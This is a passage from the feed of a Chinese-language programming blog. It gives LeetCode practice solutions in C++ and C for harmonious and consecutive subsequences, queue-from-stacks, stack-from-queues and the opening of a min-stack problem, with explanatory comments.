&gt; <span class="number">1</span>)&#123;</span><br><span class="line">                begin++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(nums[end] - nums[begin] == <span class="number">1</span>)&#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res,end-begin+<span class="number">1</span>);<span class="comment">//最长 子序列</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(N)  unordered_map&lt;int,int&gt; cnt;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">findLHS</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt; cnt;</span><br><span class="line">        <span class="keyword">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> num:nums)&#123;</span><br><span class="line">            cnt[num]++;<span class="comment">//数组每个元素出现的次数</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">auto</span> [key,val]:cnt)&#123;</span><br><span class="line">            <span class="keyword">if</span>(cnt.<span class="built_in">count</span>(key+<span class="number">1</span>))&#123;</span><br><span class="line">                res = <span class="built_in">max</span>(res,val+cnt[key+<span class="number">1</span>]);<span class="comment">//当前元素 的个数 + 下一个元素的个数</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="128-最长连续序列——数字连续，返回长度"><a href="#128-最长连续序列——数字连续，返回长度" class="headerlink" title="128 最长连续序列——数字连续，返回长度"></a>128 最长连续序列——数字连续，返回长度</h3><p>给定一个未排序的整数数组 nums ，找出<strong>数字连续的最长序列</strong>（不要求序列元素在原数组中连续）的<strong>长度</strong>。<br>请你设计并实现时间复杂度为 O(n) 的算法解决此问题。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    哈希表O(n)  unordered_set&lt;int&gt; num_set; 去重</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">longestConsecutive</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        unordered_set&lt;<span class="keyword">int</span>&gt; num_set;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span>&amp; num:nums)&#123;</span><br><span class="line">            num_set.<span class="built_in">insert</span>(num);<span class="comment">//去重</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> longestStreak = <span class="number">0</span>;<span class="comment">//记录结果</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">const</span> <span class="keyword">int</span>&amp; num:num_set)&#123;<span class="comment">//去重后的 </span></span><br><span class="line">            <span class="keyword">if</span>(!num_set.<span class="built_in">count</span>(num<span class="number">-1</span>))&#123;<span class="comment">//不存在比num小1的数</span></span><br><span class="line">                <span class="keyword">int</span> currentNum = num;<span class="comment">//起点-当前连续子序列</span></span><br><span class="line">                <span class="keyword">int</span> currentStreak = <span class="number">1</span>;<span class="comment">//长度-当前连续子序列</span></span><br><span class="line">                <span class="keyword">while</span>(num_set.<span class="built_in">count</span>(currentNum+<span class="number">1</span>))&#123;<span class="comment">//存在比当前数 大1 的数</span></span><br><span class="line">                    currentNum += <span class="number">1</span>;<span class="comment">//注意 后移 </span></span><br><span class="line">                    currentStreak += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                longestStreak = <span class="built_in">max</span>(longestStreak,currentStreak);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> longestStreak;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="力扣刷题" scheme="https://xizhi-future.github.io/categories/%E5%8A%9B%E6%89%A3%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="力扣" scheme="https://xizhi-future.github.io/tags/%E5%8A%9B%E6%89%A3/"/>
    
  </entry>
  
  <entry>
    <title>三、栈和队列</title>
    <link href="https://xizhi-future.github.io/2025/12/03/%E4%B8%89%E3%80%81%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/"/>
    <id>https://xizhi-future.github.io/2025/12/03/%E4%B8%89%E3%80%81%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</id>
    <published>2025-12-03T06:11:10.000Z</published>
    <updated>2025-12-03T06:11:29.218Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="三、栈和队列"><a href="#三、栈和队列" class="headerlink" title="三、栈和队列"></a>三、栈和队列</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">数字转字符串：<span class="built_in">to_string</span>()</span><br><span class="line">字符串转数字：<span class="built_in">stoi</span>()、<span class="built_in">stol</span>()、<span class="built_in">stof</span>()、<span class="built_in">stod</span>()等等</span><br><span class="line">大顶堆（降序）</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>&gt; big_heap;   </span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>,vector&lt;<span class="keyword">int</span>&gt;,less&lt;<span class="keyword">int</span>&gt;&gt; big_heap2;   </span><br><span class="line">小顶堆（升序）</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>,vector&lt;<span class="keyword">int</span>&gt;,greater&lt;<span class="keyword">int</span>&gt;&gt; small_heap;   </span><br></pre></td></tr></table></figure><h3 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232 用栈实现队列"></a>232 用栈实现队列</h3><p>仅使用两个栈实现先入先出队列。队列应当支持一般队列支持的所有操作（push、pop、peek、empty）：</p><p>实现 MyQueue 类：</p><pre><code>void push(int x) 将元素 x 推到队列的末尾int pop() 从队列的开头移除并返回元素int peek() 返回队列开头的元素boolean empty() 如果队列为空，返回 true ；否则，返回 false</code></pre><p>只能使用标准的栈操作 —— 也就是只有 push to top, peek/pop from top, size, 和 is empty 操作是合法的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    在push数据的时候，只要数据放进输入栈就好，但在pop的时候，操作就复杂一些，输出栈如果为空，就把进栈数据全部导入进来（注意是全部导入），再从出栈弹出数据，如果输出栈不为空，则直接从出栈弹出数据就可以了。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    最后如何判断队列为空呢？如果进栈和出栈都为空的话，说明模拟的队列为空了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; inStack,outStack;<span class="comment">//两个栈，输入栈 和 输出栈</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">in2out</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">while</span>(!inStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            outStack.<span class="built_in">push</span>(inStack.<span class="built_in">top</span>());<span class="comment">//inStack不为空的话，传给outStack</span></span><br><span class="line">            <span class="comment">//输入栈不为空的话，全输出至 输出栈，此时如果输出栈输出，则是按照队列的顺序输出</span></span><br><span class="line">            inStack.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        inStack.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(outStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="built_in">in2out</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> x = outStack.<span class="built_in">top</span>();</span><br><span class="line">        outStack.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(outStack.<span class="built_in">empty</span>())&#123;</span><br><span class="line">            <span class="built_in">in2out</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> outStack.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> inStack.<span class="built_in">empty</span>() &amp;&amp; outStack.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span>* stk;</span><br><span class="line">    <span class="keyword">int</span> stkSize;</span><br><span class="line">    <span class="keyword">int</span> stkCapacity;</span><br><span class="line">&#125; Stack;</span><br><span class="line"></span><br><span class="line"><span class="function">Stack* <span class="title">stackCreate</span><span class="params">(<span class="keyword">int</span> cpacity)</span> </span>&#123;</span><br><span class="line">    Stack* ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Stack));</span><br><span class="line">    ret-&gt;stk = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>) * cpacity);</span><br><span class="line">    ret-&gt;stkSize = <span class="number">0</span>;</span><br><span class="line">    ret-&gt;stkCapacity = cpacity;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stackPush</span><span class="params">(Stack* obj, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    obj-&gt;stk[obj-&gt;stkSize++] = x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stackPop</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    obj-&gt;stkSize--;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">stackTop</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;stk[obj-&gt;stkSize - <span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">stackEmpty</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> obj-&gt;stkSize == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">stackFree</span><span class="params">(Stack* obj)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">free</span>(obj-&gt;stk);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Stack* inStack;</span><br><span class="line">    Stack* outStack;</span><br><span class="line">&#125; MyQueue;</span><br><span class="line"></span><br><span class="line"><span class="function">MyQueue* <span class="title">myQueueCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    MyQueue* ret = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(MyQueue));</span><br><span class="line">    ret-&gt;inStack = stackCreate(<span class="number">100</span>);</span><br><span class="line">    ret-&gt;outStack = stackCreate(<span class="number">100</span>);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">in2out</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (!stackEmpty(obj-&gt;inStack)) &#123;</span><br><span class="line">        stackPush(obj-&gt;outStack, stackTop(obj-&gt;inStack));</span><br><span class="line">        stackPop(obj-&gt;inStack);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myQueuePush</span><span class="params">(MyQueue* obj, <span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    stackPush(obj-&gt;inStack, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myQueuePop</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stackEmpty(obj-&gt;outStack)) &#123;</span><br><span class="line">        in2out(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> x = stackTop(obj-&gt;outStack);</span><br><span class="line">    stackPop(obj-&gt;outStack);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">myQueuePeek</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (stackEmpty(obj-&gt;outStack)) &#123;</span><br><span class="line">        in2out(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> stackTop(obj-&gt;outStack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">myQueueEmpty</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> stackEmpty(obj-&gt;inStack) &amp;&amp; stackEmpty(obj-&gt;outStack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myQueueFree</span><span class="params">(MyQueue* obj)</span> </span>&#123;</span><br><span class="line">    stackFree(obj-&gt;inStack);</span><br><span class="line">    stackFree(obj-&gt;outStack);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="225-用队列实现栈"><a href="#225-用队列实现栈" class="headerlink" title="225 用队列实现栈"></a>225 用队列实现栈</h3><p>仅使用两个队列实现一个后入先出（LIFO）的栈，并支持普通栈的全部四种操作（push、top、pop 和 empty）。</p><p>实现 MyStack 类：</p><pre><code>void push(int x) 将元素 x 压入栈顶。int pop() 移除并返回栈顶元素。int top() 返回栈顶元素。boolean empty() 如果栈是空的，返回 true ；否则，返回 false 。</code></pre><ul><li>你只能使用队列的基本操作 —— 也就是 push to back、peek/pop from front、size 和 is empty 这些操作。</li></ul><p><strong>法一：两个队列，其中一个用于 作备份使用</strong></p><p><strong>分析：</strong></p><ul><li>队列是先进先出的规则，把一个队列中的数据导入另一个队列中，数据的顺序并没有变，并没有变成先进后出的顺序。</li><li>但是依然还是要用两个队列来模拟栈，只不过没有输入和输出的关系，而是<strong>另一个队列完全用来备份的</strong>！</li><li>用两个队列que1和que2实现队列的功能，que2其实完全就是一个备份的作用，把que1<strong>最后面的元素</strong>(准备输出)以外的元素都备份到que2，然后弹出最后面的元素，再把其他元素从que2导回que1。<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  【两个队列】</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt; que1;</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt; que2;<span class="comment">//备份</span></span><br><span class="line">    <span class="built_in">MyStack</span>()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        que1.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = que1.<span class="built_in">size</span>()<span class="number">-1</span>;<span class="comment">//留下一个元素在que1中，需要输出的元素</span></span><br><span class="line">        <span class="keyword">while</span>(len)&#123;<span class="comment">//备份至que2 </span></span><br><span class="line">            que2.<span class="built_in">push</span>(que1.<span class="built_in">front</span>());</span><br><span class="line">            que1.<span class="built_in">pop</span>();</span><br><span class="line">            len--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = que1.<span class="built_in">front</span>();</span><br><span class="line">        que1.<span class="built_in">pop</span>();</span><br><span class="line">        que1 = que2;<span class="comment">//还原</span></span><br><span class="line">        <span class="keyword">while</span>(!que2.<span class="built_in">empty</span>())</span><br><span class="line">            que2.<span class="built_in">pop</span>();<span class="comment">//清空本轮 备份队列 que2</span></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que1.<span class="built_in">back</span>();<span class="comment">//栈 的top就是 队列 的 最后一个元素 back</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que1.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    【一个队列】：一个队列在模拟栈弹出元素的时候只要将队列头部的元素（除了最后一个元素外）重新添加到队列尾部，此时再去弹出元素就是栈的顺序了</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    queue&lt;<span class="keyword">int</span>&gt; que;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">MyStack</span>()&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">        que.<span class="built_in">push</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = que.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">while</span>(len)&#123;</span><br><span class="line">            que.<span class="built_in">push</span>(que.<span class="built_in">front</span>());</span><br><span class="line">            que.<span class="built_in">pop</span>();</span><br><span class="line">            len--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> res = que.<span class="built_in">front</span>();</span><br><span class="line">        que.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.<span class="built_in">back</span>();<span class="comment">//栈 的top就是 队列 的 最后一个元素 back</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> que.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="155-最小栈"><a href="#155-最小栈" class="headerlink" title="155 最小栈"></a>155 最小栈</h3>设计一个支持 push ，pop ，top 操作<br>【在常数时间内检索到最小元素的栈】</li></ul><p>实现 MinStack 类:</p><pre><code>MinStack() 初始化堆栈对象。void push(int val) 将元素val推入堆栈。void pop() 删除堆栈顶部的元素。int top() 获取堆栈顶部的元素。int getMin() 获取堆栈中的最小元素。</code></pre><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    辅助栈</span></span><br><span class="line"><span class="comment">按照上面的思路，我们只需要设计一个数据结构，使得每个元素 a 与其相应的最小值 m 时刻保持一一对应。因此我们可以使用一个辅助栈，与元素栈同步插入与删除，用于【存储与每个元素对应的最小值】。</span></span><br><span class="line"><span class="comment">    当一个元素要入栈时，我们取当前辅助栈的栈顶存储的最小值，与当前元素比较得出最小值，将这个最小值插入辅助栈中；</span></span><br><span class="line"><span class="comment">    当一个元素要出栈时，我们把辅助栈的栈顶元素也一并弹出；</span></span><br><span class="line"><span class="comment">    【任意一个时刻，栈内元素的最小值就存储在辅助栈的栈顶元素中】</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MinStack</span> &#123;</span></span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; x_stack;</span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; min_stack;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">MinStack</span>() &#123;</span><br><span class="line">        min_stack.<span class="built_in">push</span>(INT_MAX);<span class="comment">//初始为最大值</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        x_stack.<span class="built_in">push</span>(val);</span><br><span class="line">        min_stack.<span class="built_in">push</span>(<span class="built_in">min</span>(min_stack.<span class="built_in">top</span>(),val));<span class="comment">//重点，将当前栈中最小的元素存于min_stack栈中</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        